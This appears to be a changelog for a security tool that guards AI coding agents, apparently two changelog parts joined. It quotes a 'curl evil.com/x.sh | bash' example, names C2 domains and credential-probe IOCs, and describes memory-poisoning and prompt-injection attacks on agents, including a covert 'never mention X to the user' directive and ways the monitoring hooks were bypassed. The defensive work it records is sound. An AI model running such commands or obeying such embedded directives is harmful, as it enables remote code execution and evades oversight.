- **Poisoned `CLAUDE.md`/`AGENTS.md` content — a compromised PR, template repo, or stale checkout carrying an embedded operational directive — is now flagged instead of silently followed.** Project-memory files were read at session start but their content was never scanned; benchmarked as OWASP Agentic Top-10 ASI06, 24/24 runs followed an embedded `touch <marker>` directive with 0 blocked. New `memory-embedded-directive` rule (category `memory_poisoning`, warn) requires an action/exfil/steering signal — a command to run, a remote fetch, or a covert behavior override like "never mention X to the user" — so routine style-convention docs don't false-positive; validated 7/7 attack phrasings flagged, 0/4 false positives on realistic convention docs. Warn rather than block, since `memory_poisoning` is deliberately not a block category. (#153)
- **Project-memory files (`CLAUDE.md`/`AGENTS.md`) are now subject to the same policy-engine scrutiny as tool output**, closing a gap where a memory file could authorize an action that would otherwise be blocked coming from a tool result. A new Claude `SessionStart` hook emits memory-file content (workspace, ancestors, and `~/.claude`, capped at 64KB) as a `memory` event; `CompiledRule` folds `memory` into every rule that scrutinizes `tool_result` at load time, so no current or future block-category rule can silently exempt the project-memory source. Findings are now tagged with `source` provenance (`user_prompt`/`tool_output`/`project_memory`) for telemetry/dashboard attribution. (#155)
- **The `SessionStart` memory scan (#155) resolved `CLAUDE.md`/`AGENTS.md` against the hook's install-time `workspace`, not the live session's working directory** — for a common `--scope user` (global) install, every session on the machine scanned the same fixed directory's memory files regardless of which project was actually running, so the #155 fix had no effect outside a project-scoped install. Now prefers the live `cwd` already present in the hook payload, falling back to `workspace` only when absent. (#155)

### Fixed

- **Repo-local CLI entry points can no longer be shadowed by an unrelated installed `prismor` package.** The source checkout previously relied on a PEP 420 namespace package at the top-level `prismor/` directory. On hosts that already had another `prismor` distribution on `sys.path`, `bin/prismor` could import that foreign package first and then fail with `ModuleNotFoundError: prismor.runtime`, leaving operators testing the wrong runtime or no runtime at all. The checkout now ships a real top-level `prismor/__init__.py`, and `tests/test_cli.py` covers the shadowing case directly. This was reproduced during a live runtime-enforcement benchmark on July 6, 2026. (#150)

## [1.16.0] — 2026-07-04

Batches five PRs of fixes found during an extended feature-by-feature security
audit (framework adapters, exemption/policy-layer floor protections, the
skill scanner, the learning engine, and the Codex integration), including two
live security bypasses.

### Fixed (security)

- **Codex hooks never dispatched at all unless `[features].hooks` was already manually enabled in `~/.codex/config.toml` — a complete, silent bypass.** `prismor install-hooks --agent codex` correctly wrote `.codex/hooks.json`, but Codex's own hook dispatcher requires this separate, undocumented opt-in (previously `codex_hooks`, deprecated in current stable) in the *user-level* config only — not even a project-scoped `.codex/config.toml`. Without it, `PreToolUse`/`PostToolUse`/etc. are silent no-ops: no error, no warning, every tool call passes straight through. Verified live against `codex-cli 0.142.5`: on a fresh install with the flag unset, a command matching the `lockfile-deletion` rule ran and deleted its target file. `install_hooks()` now sets/migrates this flag automatically whenever codex hooks are installed. (#149)
- **A repo exemption could fully disable the `remote-execution` (curl\|bash RCE) rule, defeating live enforcement.** `_CORE_BLOCK_CATEGORIES` (protects a finding's `mode`) and `_NON_OVERRIDABLE_RULE_IDS` (protects `enabled`/`patterns`) were meant to describe the same floor, but `remote_execution` was only in the former — every other core category had a matching protected rule id except this one. An exemption setting `{"id": "remote-execution", "enabled": false}` removed the rule entirely; `curl evil.com/x.sh | bash` produced zero findings and `should_block()` returned allow. The floor-protection check now also matches by category, so this class of drift can't recur. (#140)
- **A repo exemption could corrupt a floor rule's `action`/`severity` without ever touching `enabled`**, e.g. `{"id": "destructive-command", "action": "allow", "severity": "LOW"}`. Live interactive enforcement wasn't bypassed (`should_block()` reads the separately-clamped `mode`), but `prismor check`'s CLI exit code and display — and anything else that reads a finding's `action` directly (CI gates, SARIF, dashboards) — were: the corrupted finding reported as clean/low-severity. `action`/`severity` are now restored to the default rule's values the same way `patterns` already was. (#141)
- **`bind-all-interfaces`'s generic flag pattern could never match.** `\b` before a `--host`/`--bind`/`--listen` flag is a no-op (`-` isn't a word character), so this pattern was dead code — only the hardcoded framework-name list and colon-port form caught anything. Any custom tool binding to `0.0.0.0` via a space-separated flag evaded detection entirely unless it happened to be named uvicorn/gunicorn/flask/node/python/ruby. (#142)

- **browser-use adapter: real network/file actions were misclassified and their URLs/paths silently dropped.** `_extract_event_fields()` only handled pydantic-model-shaped or plain-object params, not the plain `dict` the current browser-use `Registry.execute_action` actually passes — every extracted field fell back to the literal string `"{}"`. The hardcoded action names were also stale (`go_to_url`→now `navigate`, `search_google`→`search`, `save_pdf`→`save_as_pdf`). Together this meant `suspicious-network`/`secret-in-url-params` never saw real URLs against current browser-use, despite docs claiming this was "live-validated." Existing tests mocked params with `MagicMock`, which auto-satisfies the pydantic-shaped branch and never exercised the real path. (#135)
- **vercel-ai adapter: fail-open didn't cover the eval-server-unreachable case.** The documented fail-open guarantee only handled a non-2xx HTTP response; an actual `fetch()` failure (connection refused — i.e. eval-server not started, the literal scenario named in the docs) threw uncaught and crashed the calling code instead of failing open. (#136)

- **Direct writes to `/etc/passwd`, `/etc/shadow`, and `/etc/sudoers` are now blocked.** The `path-traversal` rule flagged reads of these paths but never `file_write`, and no other rule covered writes — a `Write`/`Edit`-style tool call (or any SDK adapter call) targeting them passed silently in enforce mode. New `auth-file-write` rule (CRITICAL/block) covers both the shell-redirect and direct-path-write forms. (#127)
- **`PRISMOR_HOME` is now honored consistently across subsystems.** IAM, canary, and named-agent global config all hardcoded `Path.home()` regardless of `$PRISMOR_HOME`. More importantly, `store.py` had its own duplicate `_secrets_dir()` (missing the `$PRISMOR_HOME` fallback tier that cloak's `secrets_dir()` has — used by the session-store's own secret-scrubbing safety net) and duplicate `get_enrollment()` (no override at all, used by the dashboard) that disagreed with the versions used elsewhere in the CLI. All now resolve through a single `prismor_home()` helper. (#131)
- **`uninstall-hooks --agent claude`/`all` now announces when it also removes cloaking hooks.** This was already happening silently (cloak hooks share `.claude/settings.json` with the runtime-monitor hooks and get cleaned up as a side effect) with no indication that secret protection had been disabled; it's now called out explicitly in the command output, `--help`, and the CLI reference. (#126)

### Fixed

- Dashboard "Findings" tab (`/api/findings`) always returned zero results — the query correlated an outer column inside a subquery's `OFFSET` clause, which SQLite rejects (`no such column`), and the exception was silently swallowed. Rewritten using a `ROW_NUMBER()` join instead of the unsupported correlated `OFFSET`. (#129)
- Dashboard "Events" tab (`/api/events`) showed every event in a session as `verdict: "blocked"`/`severity: "critical"` if the session contained *any* finding, even fully-allowed actions — verdict/severity are now resolved per event instead of per session. (#130)
- `write_supply_chain_event()` never set `event_index` on the findings it recorded, so a blocked `supplychain npm install`/`pip install`/etc. showed as `verdict: "allowed"` in the dashboard's Events tab (its finding could never resolve back to its own event). (#134)
- `prismor policy validate` crashed with an unhandled Python traceback on malformed YAML instead of reporting a clean validation error. (#128)
- `docs/cli-reference.md` no longer lists `workspace show` / `exempt status` as subcommands — neither exists (`workspace` with no argument shows status; `exempt` only has `request`). (#132)
- `docs/frameworks-crewai.md`'s examples imported `from crewai_tools import tool` — a separate package not installed by `pip install "prismor[crewai]"` and not mentioned anywhere in the doc. Changed to `from crewai.tools import tool`, which ships built-in with current `crewai` and requires no extra install. (#137)
- `prismor scan` mislabeled the `agent` for any config whose full path happened to contain another agent's name as a substring (e.g. a workspace path containing "claude" anywhere caused a real Cursor/Windsurf/etc. config's findings to be reported under `agent: "claude"`) — `parse_config()` re-guessed the agent via path substring matching instead of using the value `discover_configs()` already knew. (#143)
- `docs/learning.md`'s own worked example (a recurring `psql ... prod` command) could never actually be mined — no database client was in the learning engine's `_SENSITIVE_COMMANDS` allowlist. Added `psql`/`mysql`/`mysqlsh`/`redis-cli`/`mongosh`/`sqlite3`. (#146)
- `prismor learn --apply` wrote `.prismor/policy.yaml` without the required `version` field when no policy file existed yet, so the docs' own next step (`prismor policy validate`) failed immediately with "Missing required field: version" — even though the learned rule worked correctly at runtime. (#147)

### Added

- Regression tests for all four framework adapters now exercise their real framework's actual objects (`agents.Agent`/`FunctionTool`, `langchain_core.tools.Tool`, `crewai.tools.tool`/`BaseTool`, `browser_use.Controller`) rather than bare callables or mocks — gated with `importorskip`/`skipif` so they run when the framework is installed and skip cleanly otherwise. `langchain` and `crewai` had no adapter tests at all before this; `openai-agents` and `browser-use` only tested the framework-agnostic fallback path. This is exactly the gap that let #135 ship undetected. (#138)
- `adapters/vercel-ai` gained its first test suite (`npm test`, Node's built-in test runner, no live eval-server needed — global `fetch` is stubbed), covering the fail-open fix above.
- **`prismor scan` now actually discovers and scans Claude Code Skill files** (`.claude/skills/<name>/SKILL.md`), not just JSON-shaped MCP server configs and OpenClaw's `skills` list — this is the real, primary "community skill contains malicious patterns" attack surface the `skill-exfil-url`/`skill-encoded-payload` rules exist for, and it was previously never discovered at all. Also fixed `skill-shell-injection`'s bare `` `[^`]+` `` backtick pattern, which matched any markdown inline-code span — a massive false-positive generator now that real skill prose is actually scanned; narrowed to real `$(...)` command substitution. (#144)

## [1.15.1] — 2026-07-04

### Fixed

- `release.yml` now derives the `immunity-agent` redirect shim's version and `prismor>=` dependency floor from `prismor/runtime/__init__.py` at release time instead of relying on a hand-maintained copy in `packaging/immunity-agent-shim/pyproject.toml`. The `1.15.0` release published `prismor` correctly but the shim publish step failed (`400 File already exists`) because its hardcoded version hadn't been bumped past `1.14.2`. Both PyPI publish steps also now pass `skip-existing: true` so a re-run after a partial failure doesn't hard-fail on the artifact(s) that already published successfully.

## [1.15.0] — 2026-07-04

First release published under the **`prismor.runtime`** namespace — the internal `warden` package name is fully retired. Also closes several cloak and policy gaps that shipped in source after `1.14.2` was cut but were never released.

### Changed

- **Renamed the runtime package to `prismor.runtime`** (from `warden`) — the `prismor`/`immunity` (deprecated alias) console scripts now point at `prismor.runtime.immunity_cli:main`. No command-line behavior changes.
- **`prismor.*` namespace imports for framework adapters** — the Python adapters are now importable as `from prismor.openai import guard_agent`, `from prismor.langchain import guard_tool`, `prismor.crewai`, and `prismor.browser_use` (PEP 420 namespace packages; adapter distributions bumped to 0.2.0). The old flat `prismor_*` module names keep working as aliases of the same module objects.
- Dashboard: new agent control tab, enterprise upsell panel, refreshed site fonts.
- Telemetry: guard-eval latency and matched-pattern fields, tamper-evident hash chain, new `prismor doctor` command for a one-shot health check (hooks, policy, enrollment, remote policy signature, telemetry sink/spool, integrity chain).
- CI now gates cloaking + policy tests as a dedicated security-regression suite on every PR.

### Fixed (security)

- **Cloak now scrubs secrets from all Bash output, not just placeholder substitutions.** `decloak.sh` wraps every Bash command's combined stdout/stderr once any secret is registered, closing the leak path where a value is read straight out of a file (`cat .env`, `grep KEY config`) without ever passing through an `@@SECRET:name@@` placeholder. New `read-guard.sh` hook denies a `Read` of any file that contains a registered secret.
- Cloak blocks `@file` mentions of secret-bearing files (Claude Code's `@`-mention shorthand), closing another path a raw secret could reach the model's context.
- **World-writable `chmod`/`chown` bypass closed in the live policy engine, not just the legacy pattern set** — `chmod 666`, `chmod 0777`/`1777`, `chmod -R 777 <any dir>`, and symbolic grants (`a+rwx`, `o+w`, `ugo+rwx`) are now blocked in enforce mode across `prismor check`, real hook dispatch, and every SDK adapter. (#121)
- CLI `--help`/usage output and `--version` no longer say `immunity` / `immunity-agent` — both now report `prismor`. (#124)
- `scripts/install.sh` now verifies the `prismor` resolved on `$PATH` actually matches the version it just installed, and fails loudly instead of reporting success when a stale/conflicting prior install (e.g. an old `easy_install` script or leftover `immunity-agent` venv) shadows it. (#123)
- Adapter distributions now depend on `prismor>=1.13.0` instead of the deprecated `immunity-agent` package name.
- The wheel now bundles the framework docs (`frameworks-*.md`), `sdk-integration.md`, and `connecting-to-the-platform.md` under `prismor/runtime/data/docs/`, so links from the installed skill's `SKILL.md` resolve.
- Post-install banner and `scripts/init.sh` no longer reference the old `immunity-agent` name/repo; `package.json` metadata updated to `prismor`.

## [1.13.0] — 2026-06-29

First release published to PyPI under the new **`prismor`** package name. `immunity-agent` is now a deprecated redirect package.

### Changed

- **`prismor` is the canonical PyPI package** — `pip install prismor` is the supported install path going forward. The package ships the full Prismor runtime, supply-chain engine, and CLI (`prismor`, with `immunity` kept as a deprecated alias).

### Deprecated

- **`immunity-agent` is now a thin redirect package** — `pip install immunity-agent` installs `prismor` as a dependency and surfaces a "renamed to prismor" notice on its PyPI page. It carries no code of its own; existing installs keep working via the bundled `prismor` CLI. Use `pip install -U prismor` instead.

## [1.11.0] — 2026-06-26

Supply-chain block/observe output now includes safe version recommendations, and setup writes agent context files for all supported agents.

### Added

- **Safe version recommendations in supply-chain output** — `_score_package()` now calls `recommend_safe_version()` and embeds `safe_version` and `remediation` fields in every `dependency_risk` finding. Block messages print the recommended fix version on stderr; observe mode emits all findings (not just the first) with remediation hints so agents know exactly which packages to pin.
- **Agent context files written on onboarding** — `prismor setup` now calls `_write_agent_context()` unconditionally, writing the key prismor commands (`prismor status`, `supplychain`, `check`, `deps`) into `.cursorrules`, `.windsurfrules`, or `AGENTS.md` depending on the agents selected. Cursor, Windsurf, Codex, Copilot, Hermes, and OpenClaw users all get the reference on first install.
- **SKILL.md installed for all agents** — removed the `if "claude" in agents` gate; SKILL.md now lands in every workspace regardless of agent choice.

## [1.10.0] — 2026-06-24

Setup wizard slimmed to 4 steps, live version banner, and removal of the security-playbook integration.

### Changed

- **Setup wizard is now 4 steps** — the detection-rules toggle step is gone; all rules ship enabled by default. The wizard flows mode → agents → cloak → scope.
- **Version banner reads the live package version** — the banner now reflects `__version__` (mirrored in `scripts/setup.py` with a file-parse fallback) instead of a hardcoded value.
- **Cloak install no longer shells out to the deprecated `prismor` binary** — the "`prismor` is deprecated" warning no longer appears during setup.

### Removed

- **All security-playbook references** — setup no longer wires the playbook into `CLAUDE.md` or prints a Guardrails link; references stripped from `CLAUDE.md`, `AGENTS.md`, and `PYPI.md`, pointing at local `SKILL.md`/docs instead.

## [1.9.0] — 2026-06-24

Setup wizard install-scope control and CLI help/rules-list polish.

### Added

- **Install-scope step in `prismor setup`** — a new wizard step lets you choose between installing Prismor hooks for the current workspace only (`.claude/settings.json`) or globally for every project (`~/.claude/settings.json`). The chosen scope now flows through hook and cloak installation (previously hard-coded to `project`). Exposed on `run_non_interactive` via `scope=`.

### Changed

- **Detection-rules step is sorted and truncated** — rules are ordered CRITICAL → HIGH → MEDIUM → LOW and the list shows the top 15 by default with an `e` to expand / `c` to collapse, so long rule sets stay readable.
- **`prismor help` shows full command names** — commands, sub-actions, and the Help/Deprecated sections now render the full `prismor <cmd>` form instead of bare names, so entries are copy-pasteable.

## [1.8.0] — 2026-06-23

CLI UX consolidation, Codex agent support, and supply-chain enforcement hardening.

### Added

- **Codex (OpenAI) agent support** — `--agent codex` wires Prismor hooks into Codex CLI (`.codex/hooks.json`) for real-time monitoring.
- **`prismor status --all`** — global overview across every registered workspace (the old `prismor dashboard` text view), with `--days N` to set the activity window.
- **Bundled Claude skill** — `prismor setup` now installs the `immunity-agent` skill (SKILL.md + docs) into `<workspace>/.claude/skills/immunity-agent/` for Claude Code, so the agent learns to drive the CLI. The skill ships inside the wheel.

### Changed

- **`prismor dashboard` opens the web dashboard** — it now starts the local server *and* opens a browser tab (`--no-open` for headless). `prismor serve` is kept as a deprecated alias of `dashboard --no-open`.
- **`prismor info` → real alias of `status`** — the duplicate workspace-info renderer is gone; `info` now delegates to `status`.
- **Complete, introspection-driven `prismor help`** — every command is listed (previously `sandbox`/`learn` were omitted), grouped, with each domain's sub-actions and each command's mode flags (`sweep --redact/--clean/…`, `audit --fix`, `status --all`) shown inline. Generated from the live parser so it can't drift.
- **`prismor` (bare) no longer dumps the argparse usage wall** — it prints a one-line deprecation pointer to `prismor help`. `prismor <cmd>` still warns and forwards.
- **Install banner relabeled** — `Hooks` / `Skill` / `Guardrails` (was the conflated "Skills").

### Fixed

- **Supply-chain enforcement gap** — closes a gap across hooks, ecosystems, and dependency depth so install gating applies consistently; adds lockfile-integrity coverage.

## [1.7.1] — 2026-06-17

Enterprise audit hardening and branding rename.

### Fixed

- **Non-overridable enforcement floor (audit #1/#3/#12)** — floor rules (core IDs and core block categories) get `mode: enforce` regardless of `default_mode` and can no longer be downgraded by a policy overlay. Synthetic `action: block` findings (canary, vault, secret-exfil, taint, HTML-injection) are normalized to `mode: enforce`, restoring block intent that per-rule modes had dropped.
- **Telemetry title redaction (audit #5)** — redacted-mode records no longer forward raw paths/hosts/URLs/secrets via the dynamic title; `assert_redacted` now also rejects path/host/URL leaks in the title.
- **Control-plane refresh clamp, heartbeat permissions, logout cleanup, spool age-cap (audit #11/#18/#20)** — `PRISMOR_POLICY_REFRESH_SECONDS` is clamped to `[5s, 600s]`; `heartbeat.json` is now `chmod 0600`; logout clears `heartbeat.json` and `workspace-scopes.json`; telemetry spool drops records older than 30 days (`PRISMOR_SPOOL_MAX_AGE_DAYS`).
- **Telemetry repo identifier gating (audit #17)** — personal/local-only workspaces never attach their git remote to telemetry, mirroring the existing heartbeat gate.

### Changed

- **Rebrand to "Prismor Immunity Agent"** — replaces "Prismor" / "PRISMOR IMMUNITY" labels across the CLI, setup wizard, hooks, dashboard, and tests; `--version` string updated.
- **Dashboard `--days` window + sparklines** — `prismor dashboard` accepts `--days N` (default 7) to filter session data; adds per-workspace and global sparkline bars showing the daily findings trend. Web dashboard gains a Period dropdown (7/14/30/90 days).

### Docs

- README: new "Disabling Immunity Agent" section covering hook uninstall, observe+dry-run soft-disable, and clearing per-session scoped-agent rules.

## [1.7.0] — 2026-06-16

Enterprise control-plane and policy hardening release.

### Added

- **Enterprise control-plane** — signed remote policy pulls, device identity and enrollment, layered workspace scoping, admin-granted exemptions, offline telemetry spool, and heartbeat / telemetry ingest hardening.
- **Per-rule enforcement** — policy-authoritative observe/enforce modes now gate on each rule's effective mode instead of the global install mode alone.
- **Pattern customization** — add/disable pattern overrides with compile isolation and a non-weakening floor for core rules.
- **Prompt-injection coverage** — deterministic regex and heuristic coverage expanded to close benchmark false negatives without adding LLM cost.
- **Supply-chain hardening** — gitleaks version gating, cross-platform install hints, AI-key ruleset, and graceful fallback scanning when the binary is absent.

### Fixed

- **Session-report follow-ups** — closes the remaining v1.6.0 report issues, including claude transcript scoping, exfiltration-directive detection, SCM-domain false positives, and shell-level PII detection.

## [1.6.0] — 2026-06-05

Hermes Agent secret cloaking plugin. Secret prevention now works natively inside Hermes Agent (Nous Research's AI agent platform), with dual-discovery via pip entry point or filesystem install.

### Added

- **Hermes Agent cloaking plugin** (`prismor/runtime/cloaking/hermes_plugin_entry.py`) — shared `register()` function consumed by both Hermes' pip entry-point discovery and filesystem install. Five hooks: `pre_tool_call` (decloak + secret guard), `post_tool_call` (audit), `transform_terminal_output` (scrub), `transform_tool_result` (scrub), `pre_gateway_dispatch` (paste guard).
- **Hermes installer** (`prismor/runtime/cloaking/hermes_installer.py`) — `install()`/`uninstall()`/`status()` for filesystem-level setup. Copies plugin files to `~/.hermes/plugins/prismor-cloak/`, enables it in Hermes config, and sets `PRISMOR_SECRETS_DIR` env var.
- **`pyproject.toml` entry point** — registers `prismor-cloak` under `[project.entry-points."hermes_agent.plugins"]` for auto-discovery when immunity-agent is pip-installed.
- **`prismor cloak install --agent hermes`** — new `--agent` flag on `cloak install`/`uninstall`/`status` supports `claude`, `hermes`, or `all`. Installs for both agents in one command.
- **`prismor cloak status`** — now shows both Claude Code and Hermes Agent state separately.
- **Auto-vaulting for pasted secrets** — `pre_gateway_dispatch` detects raw secrets in user prompts, vaults them under deterministic `auto_<sha256_prefix>` names, and re-sends the sanitized prompt with `@@SECRET:auto_xxx@@`. Bypass with `!!allow` prefix.
- **Documentation:** `docs/hermes.md` with architecture diagram, setup guide, and hook reference. AGENT_INTEGRATIONS.md updated with Hermes cloaking layer.

### Packaging

- Hermes plugin files (`plugin.yaml`, `__init__.py`) are force-included in the wheel under `prismor/runtime/data/cloaking/hermes-plugin/` for filesystem install.
# Changelog

All notable changes to Immunity Agent (Prismor) are documented here.
The format loosely follows [Keep a Changelog](https://keepachangelog.com/)
and the project uses [Semantic Versioning](https://semver.org/).

## [1.5.7] — 2026-05-31

Onboarding reliability: the installer can no longer report success while
installing nothing, and a broken/partial install can no longer break the
host Python. Also ships the hybrid semantic prompt-injection defense from
1.5.6, which was bumped in code but never published to PyPI.

### Fixed

- **`scripts/init.sh` — honest install status.** The git-clone path printed
  `Prismor: hooks installed` unconditionally, even when every `install-hooks`
  call failed (errors were swallowed by `2>/dev/null`). The final banner is
  now driven by a real success counter: zero hooks installed → loud
  `Initialization FAILED` and exit 1, with the underlying error surfaced
  instead of hidden.
- **`immunity-agent.pth` — crash-proof startup hook.** The shipped `.pth`
  ran `import prismor.runtime._post_install` at every Python interpreter startup. If
  `prismor` was ever unimportable (e.g. an editable install whose source dir
  was later deleted), this printed a traceback on *every* `python3`
  invocation machine-wide and poisoned the `prismor` namespace so the cloned
  CLI also failed. Now wrapped in `try/except` so it can never raise.
- **`scripts/init.sh` — `immunity` on PATH.** The git-clone path never added
  the CLI to PATH, so the next documented command (`prismor cloak add`) was
  `command not found`. It now symlinks into `/usr/local/bin` (or appends to
  the shell rc).
- **`scripts/init.sh` — non-interactive exit code.** The trailing "Check
  current session?" prompt hit EOF under `set -e` in piped/CI runs and made
  the installer exit 1 *after* a fully successful install. It is now gated on
  a TTY. Also corrects the stale `prismor.git` → `immunity-agent.git` repo URL
  and only shows the "switch to enforce mode" hint when not already enforcing.

## [1.5.6] — 2026-05-28

Hybrid semantic prompt-injection defense.

### Added

- **`prismor/runtime/semantic_guard.py`** — heuristic semantic-injection detector with
  35+ weighted regex signals covering authority claims, compliance pretexts,
  friction-reduction manipulation, roleplay/jailbreak framing, instruction
  override, credential exfiltration, Prismor self-bypass, nested file-injection
  markers, and indirect privilege escalation. Optional Claude API mode (no
  API key required for the default path).
- **`prismor/runtime/semantic_guard_v2.py`** — hybrid guard with uncertain-zone
  escalation. Pipeline: heuristic pre-screen → if score in `[low, high)`,
  escalate to a local Claude Code CLI subagent (no API key needed); merge
  the stricter verdict. Falls back to heuristic-only when the CLI is absent.
- **`PolicyEngine` integration** — opt-in `settings.semantic_guard` block in
  `default_policy.yaml`. Emits `prompt_injection_semantic` findings alongside
  regex findings; participates in session taint marking. Off by default;
  zero overhead unless enabled per-project.
- **`prismor semantic-check`** CLI subcommand — ad-hoc analyzer for tuning
  policies and debugging false positives. Supports `--mode hybrid|heuristic|api`
  and `--json` output.
- **`tests/test_semantic_guard.py`** — 15 unit tests covering heuristic
  detection, threshold gating, CLI-absent graceful degrade, and PolicyEngine
  integration.

### Notes

Benchmarked on 826 cases spanning OWASP LLM01–LLM10, OWASP Agentic T02–T04,
MITRE-ATLAS, and nested-file injection: F1 improves 0.697 → 0.822; semantic
attack recall improves 8% → 72%; the LLM subagent is invoked on 1.8% of
events (15/826). Enable per-project with:

```yaml
# .prismor/policy.yaml
settings:
  semantic_guard:
    enabled: true
```

## [1.5.0] — 2026-05-13

Expanded IOC coverage and prompt injection defense.

### Added

- **Prompt injection defense** (`prismor/runtime/sanitizer.py`, `prismor/runtime/policy_engine.py`):
  - `sanitizer.py` — structural HTML detector catching injections hidden in HTML
    comments, CSS-invisible elements (`display:none`, `visibility:hidden`,
    `font-size:0`, transparent color), `aria-hidden` elements, and zero-width
    character obfuscation. Complement to YAML regex rules.
  - `_TaintStore` — per-session taint state persisted across hook invocations.
    Once a prompt injection is detected, all subsequent network calls in the
    session are escalated to CRITICAL, closing the response-blind exfiltration gap.
  - `_check_cloaked_secrets_in_url` — checks enrolled cloaking secrets against
    outbound URLs regardless of key shape (fills the gap the YAML patterns can't cover).
  - Two new CRITICAL policy rules: `prompt-injection-hidden` and `secret-in-url-params`
    (covers Anthropic, OpenAI, GitHub, AWS, Slack, Google, Stripe key shapes).

- **Expanded mini-shai-hulud IOC coverage** (`supplychain/ioc.py`):
  - New compromised namespaces: `@opensearch-project/*` (1.3M weekly downloads),
    `@uipath/*` (65 packages).
  - New PyPI packages: `mistralai==2.4.6`, `guardrails-ai==0.10.1`.
  - New C2 domain: `git-tanstack.com` (Cloudflare-flagged phishing domain).
  - New payload hash: `tanstack_runner.js` (SHA-256 `ce7e4199...`).
  - New script patterns: AWS IMDS probe (`169.254.169.254`), HashiCorp Vault
    probe (`127.0.0.1:8200`), GitHub GraphQL worm propagation
    (`createCommitOnBranch`), token regexes (`ghp_*`, `npm_*`), and new
    persistence paths (`.claude/setup.mjs`, `.claude/router_runtime.js`,
    `.vscode/setup.mjs`).
  - Attribution: TeamPCP — same actor as March 2026 Trivy supply chain compromise.

## [1.4.0] — 2026-05-12

Supply Chain Enforcement — `immunity` CLI. Intercepts package manager install
commands before execution, scores each package against live threat intelligence,
and blocks or warns based on risk signals. Ships with IOC coverage for the
mini-shai-hulud attack (May 11 2026) out of the box.

### Added

- **`immunity` CLI wrapper** — shebang script at repo root intercepts
  `npm/pip/pnpm/uv/cargo/go install` commands before execution.
- **`supplychain/ecosystems/detector.py`** — parses install argv into a
  structured `InstallEvent` across 9 ecosystems.
- **`supplychain/ecosystems/metadata.py`** — fetches npm and PyPI registry
  metadata (age, maintainers, install scripts); stdlib only, fail-open.
- **`supplychain/scoring/engine.py`** — additive signal scorer producing
  allow/warn/block verdicts.
- **`supplychain/ioc.py`** — IOC database covering `@tanstack/*`,
  `@mistralai/mistralai` 1.7.1–2.2.4, C2 domains (`getsession.org`,
  `masscan.cloud`), and install script patterns (Bun download,
  `router_init.js`, credential env var access, persistence writes).
- **`docs/supply-chain.md`** — full documentation: usage, scoring table,
  ecosystem support, IOC advisory for mini-shai-hulud, guide for adding new
  IOCs, internal architecture.

## [1.3.0] — 2026-05-11

Web Dashboard — `prismor serve`. Introduces a local HTTP API server and
self-contained browser dashboard that aggregates session, findings, and event
data from all registered workspaces.

### Added

- **`prismor serve` command** (`prismor/runtime/server.py`, `prismor/runtime/dashboard.html`).
  Starts a local HTTP server (default `127.0.0.1:7070`) serving a
  self-contained Prismor dashboard. Accepts `--host` and `--port` flags.
- **Dashboard UI** with severity breakdown strip (critical/high/medium/low
  counts), recent sessions table with risk-score bars, and a findings drilldown
  with agent/severity/category filters, free-text search, and expandable
  evidence rows showing raw command/path and session ID.
- **Server-side pagination** for sessions (`/api/sessions`), findings
  (`/api/findings`), and events (`/api/events`) — each endpoint accepts
  `page`, `limit`, sort, and filter query params; returns
  `{items, total, page, pages, limit}`.
- **Live event feed** with verdict (blocked/allowed) and agent filter controls;
  auto-poll pauses when user has active filters or is past page 1.
- **`get_sessions_page()`, `get_findings_page()`, `get_events_page()`** added
  to `prismor/runtime/store.py`; `get_aggregate_stats()` extended with
  `severityBreakdown`, `recentSessions`, and `recentFindings`.

### Fixed

- **XSS prevention in dashboard**: replaced all `innerHTML` string
  concatenation with a `safe()` helper that text-encodes untrusted values
  before inserting them into the DOM.

## [1.2.0] — 2026-04-27

Tier 3 — Scoped Agent and Session-Based Learning. Adds per-session rule
synthesis via the Anthropic API, a session-based learning engine that mines
uncovered command patterns and detects evasion attempts, and five security
and correctness fixes from code review.

### Added

- **Scoped Agent** (`prismor/runtime/scoped_agent.py`). On `UserPromptSubmit`, Prismor
  calls the Anthropic API (Haiku) to synthesise a minimal, task-specific rule
  set from the user's goal — restricting tools, file paths, and network access
  to only what the task genuinely requires. Falls back to keyword-based static
  heuristics when no API key is present. Scoped rules are stored as JSON
  sidecar files in `.prismor/scoped/` and enforced alongside
  `policy.yaml` for the duration of that session only.
- **Session-Based Learning** (`prismor/runtime/learning.py`). Mines historical session
  data for recurring uncovered command patterns, tracks false positives from
  dismissed findings, and detects evasion attempts where structurally similar
  commands (e.g. backtick vs `$()` substitution) bypass existing rules.
  Candidate rules can be reviewed and promoted to `policy.yaml`.
- **`prismor scope` subcommands** — `show`, `list`, `edit`, `clear` for
  inspecting and managing active scoped sessions.
- **`prismor learn` subcommands** — `--json`, `--apply`, `--reject`,
  `--candidates` for reviewing and acting on mined rule proposals.
- **Evasion detection** — shell commands that pass policy but are structurally
  similar (Jaccard ≥ 0.6 after substitution normalisation) to a recently
  blocked command in the same session are flagged as `HIGH` findings.
- **Dismissal tracking** — in observe mode, dismissed findings are recorded
  in the database and surfaced via `prismor learn` as false-positive candidates.

### Fixed

- **Prompt-injection mitigation in scoped rule synthesis**: LLM-returned
  `allowed_tools` and `deny_tools` are now clamped to the known-good
  `available_tools` list, preventing a crafted task prompt from expanding the
  scoped policy beyond what the agent actually has access to.
- **Command injection in `prismor scope edit`**: replaced
  `os.system(f'{editor} "{path}"')` with `subprocess.run([editor, path])`
  to prevent shell metacharacter exploitation via the `$EDITOR` env var.
- **`KeyError: 'id'` in `prismor learn` output**: `format_learning_report`
  now uses `c.get('id', c['rule'].get('id', '?'))` so freshly-mined
  candidates (not yet persisted to the DB) display correctly.
- **Misleading scoped-rules display text**: the rules box now correctly states
  that rules persist in `.prismor/scoped/` rather than claiming they
  are not saved.
- **Removed dead `get_scoped_dir()` from `prismor/runtime/store.py`**: the function
  was unreachable and pointed to a different path than `scoped_agent._scoped_dir`.

## [1.1.0] — 2026-04-24

Tier 1 coverage expansion from `IMPROVEMENT_PLAN.md` — focused on closing
audit-level detection gaps and adding the developer- and SIEM-facing
ergonomics features enterprise buyers expect. Continues from `1.0.2`.

### Added

- **Canarytoken subsystem** (`prismor canary plant|list|remove|status`). Plant
  realistic fake credentials (AWS, SSH, `.env`, generic) at arbitrary paths;
  any read raises a `CRITICAL` finding and optionally POSTs a signed payload
  to a user-provided webhook. First AI-agent-specific canarytoken
  implementation we're aware of. (`prismor/runtime/canary.py`)
- **MCP schema auditor** — `prismor scan` now statically analyses MCP tool
  schemas for over-broad allowlists (`"*"`, `"/**"`), risky description
  language (`bypass`, `all files`, `sudo`), `any`-typed parameters on
  execution-capable tools, missing input schemas, and servers that combine
  execution with filesystem + network access in a single surface.
  (`prismor/runtime/scanner.py::audit_mcp_schema`)
